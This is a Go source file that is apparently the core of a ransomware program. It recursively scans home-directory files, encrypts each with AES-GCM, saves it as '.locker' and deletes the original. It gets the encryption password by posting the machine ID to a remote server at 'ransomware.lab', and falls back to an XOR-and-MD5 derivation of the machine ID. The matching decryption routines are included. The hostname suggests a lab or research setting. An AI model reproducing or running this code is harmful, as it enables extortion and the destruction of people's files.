package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

var skipDirs = map[string]bool{
	".git": true, ".svn": true, ".hg": true, ".vscode": true, ".idea": true,
	".cache": true, "cache": true, "Cache": true, "Caches": true,
	"tmp": true, "temp": true, "Temp": true, ".tmp": true,
	"node_modules": true, "vendor": true, "target": true, "build": true,
	"dist": true, "out": true, ".next": true, ".nuxt": true,
	"__pycache__": true, ".pytest_cache": true, ".tox": true,
	"venv": true, ".venv": true, "env": true, ".env": true,
	".mypy_cache": true, ".ruff_cache": true,
	".npm": true, ".yarn": true, ".pnpm": true, ".cargo": true,
	".rustup": true, ".gradle": true, ".m2": true,
	".Trash": true, "Trash": true, "$Recycle.Bin": true,
	"System Volume Information": true, ".DS_Store": true,
	"AppData": true, "Local Settings": true, "Application Data": true,
	"logs": true, "log": true, ".log": true,
	".mozilla": true, ".chrome": true, ".chromium": true, ".firefox": true,
	".config": true, ".local": true, ".dbus": true,
}

var xorKey = []byte{0xA5, 0x3C, 0x7F, 0x19, 0xD2, 0x4E, 0x8B, 0x61}

func scan(dir string, depth, maxDepth int, files *[]string) {
	if depth > maxDepth {
		return
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if skipDirs[entry.Name()] {
			continue
		}

		path := filepath.Join(dir, entry.Name())

		if !entry.IsDir() {
			*files = append(*files, path)
		} else if entry.Type()&os.ModeSymlink == 0 {
			scan(path, depth+1, maxDepth, files)
		}
	}
}

func getHomeDir() string {
	if home := os.Getenv("HOME"); home != "" {
		return home
	}
	if runtime.GOOS == "windows" {
		if home := os.Getenv("USERPROFILE"); home != "" {
			return home
		}
	}
	if u, err := user.Current(); err == nil {
		return u.HomeDir
	}
	return ""
}

func deriveAESKey(password string) [32]byte {
	return sha256.Sum256([]byte(password))
}

func clearString(s *string) {
	if s == nil || *s == "" {
		return
	}
	b := []byte(*s)
	for i := range b {
		b[i] = 0
	}
	*s = ""
}

func clearAESKey(key *[32]byte) {
	if key == nil {
		return
	}
	for i := range key {
		key[i] = 0
	}
}

func isLockerFile(filePath string) bool {
	return len(filePath) > 7 && filePath[len(filePath)-7:] == ".locker"
}

func encryptFile(filePath string, aesKey [32]byte) ([]byte, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("cannot read file %s: %v", filePath, err)
	}

	block, err := aes.NewCipher(aesKey[:])
	if err != nil {
		return nil, fmt.Errorf("cannot create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cannot create GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("cannot generate nonce: %v", err)
	}

	encryptedContent := gcm.Seal(nil, nonce, content, nil)
	result := append(nonce, encryptedContent...)
	return result, nil
}

func writeEncryptedFile(filePath string, encryptedContent []byte) error {
	lockerPath := filePath + ".locker"

	if err := os.WriteFile(lockerPath, encryptedContent, 0644); err != nil {
		return fmt.Errorf("cannot write encrypted file %s: %v", lockerPath, err)
	}

	if err := os.Remove(filePath); err != nil {
		return fmt.Errorf("cannot remove original file %s: %v", filePath, err)
	}

	return nil
}

func decryptFile(lockerPath string, aesKey [32]byte) ([]byte, error) {
	encrypted, err := os.ReadFile(lockerPath)
	if err != nil {
		return nil, fmt.Errorf("cannot read locker file %s: %v", lockerPath, err)
	}

	block, err := aes.NewCipher(aesKey[:])
	if err != nil {
		return nil, fmt.Errorf("cannot create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cannot create GCM: %v", err)
	}

	nonceSize := gcm.NonceSize()
	if len(encrypted) < nonceSize {
		return nil, fmt.Errorf("invalid locker file format: too small")
	}

	nonce := encrypted[:nonceSize]
	encryptedContent := encrypted[nonceSize:]

	decrypted, err := gcm.Open(nil, nonce, encryptedContent, nil)
	if err != nil {
		return nil, fmt.Errorf("cannot decrypt file content: %v", err)
	}

	return decrypted, nil
}

func writeDecryptedFile(lockerPath string, decryptedContent []byte) error {
	originalPath := lockerPath[:len(lockerPath)-7]

	if err := os.WriteFile(originalPath, decryptedContent, 0644); err != nil {
		return fmt.Errorf("cannot write decrypted file %s: %v", originalPath, err)
	}

	if err := os.Remove(lockerPath); err != nil {
		return fmt.Errorf("cannot remove locker file %s: %v", lockerPath, err)
	}

	return nil
}

func getPasswordFromServer() (string, error) {
	machineID, err := getMachineID()
	if err != nil {
		return "", fmt.Errorf("failed to get machine ID: %v", err)
	}

	payload := map[string]string{"machineid": machineID}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %v", err)
	}

	resp, err := http.Post(
		"http://ransomware.lab/generate",
		"application/json",
		bytes.NewReader(payloadBytes),
	)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Warning: server is not accessible, using machineID as password\n")
		return machineID, nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, err := io.ReadAll(resp.Body)
		if err == nil {
			fmt.Fprintf(os.Stderr, "Response Body: %s\n", string(body))
		}
		fmt.Fprintf(os.Stderr, "Warning: server error (status %d), using machineID as password\n", resp.StatusCode)
		return machineID, nil
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		fmt.Fprintf(os.Stderr, "Warning: failed to parse server response, using machineID as password\n")
		return machineID, nil
	}

	password, ok := result["password"].(string)
	if !ok {
		fmt.Fprintf(os.Stderr, "Warning: password from server is invalid, using machineID as password\n")
		return machineID, nil
	}

	return password, nil
}

func getMachineID() (string, error) {
	switch runtime.GOOS {
	case "linux":
		return getMachineIDLinux()
	case "darwin":
		return getMachineIDMacOS()
	case "windows":
		return getMachineIDWindows()
	default:
		return "", fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}
}

func getMachineIDLinux() (string, error) {
	data, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		return "", fmt.Errorf("failed to read machine-id: %v", err)
	}
	return strings.TrimSpace(string(data)), nil
}

func getMachineIDMacOS() (string, error) {
	cmd := exec.Command("ioreg", "-rd1", "-c", "IOPlatformExpertDevice")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to run ioreg: %v", err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "IOPlatformUUID") {
			parts := strings.Split(line, "\"")
			if len(parts) >= 4 {
				return strings.TrimSpace(parts[3]), nil
			}
		}
	}

	return "", fmt.Errorf("failed to find IOPlatformUUID in ioreg output")
}

func getMachineIDWindows() (string, error) {
	cmd := exec.Command("wmic", "csproduct", "get", "uuid")
	output, err := cmd.Output()
	if err != nil {
		return getMachineIDWindowsRegistry()
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && line != "UUID" {
			return line, nil
		}
	}

	return "", fmt.Errorf("failed to find UUID from wmic")
}

func getMachineIDWindowsRegistry() (string, error) {
	cmd := exec.Command("reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "/v", "MachineId")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to query registry: %v", err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "MachineId") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				return parts[len(parts)-1], nil
			}
		}
	}

	return "", fmt.Errorf("failed to find MachineId in registry")
}

func xorBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	keyLen := len(key)
	for i, b := range data {
		result[i] = b ^ key[i%keyLen]
	}
	return result
}

func generatePasswordFromMachineID() (string, error) {
	machineID, err := getMachineID()
	if err != nil {
		return "", fmt.Errorf("failed to get machine ID: %v", err)
	}

	if machineID == "" {
		return "", fmt.Errorf("machineID is empty")
	}

	machineIDBytes := []byte(machineID)
	xoredBytes := xorBytes(machineIDBytes, xorKey)
	hash := md5.Sum(xoredBytes)
	password := fmt.Sprintf("%x", hash)
	return password, nil
}
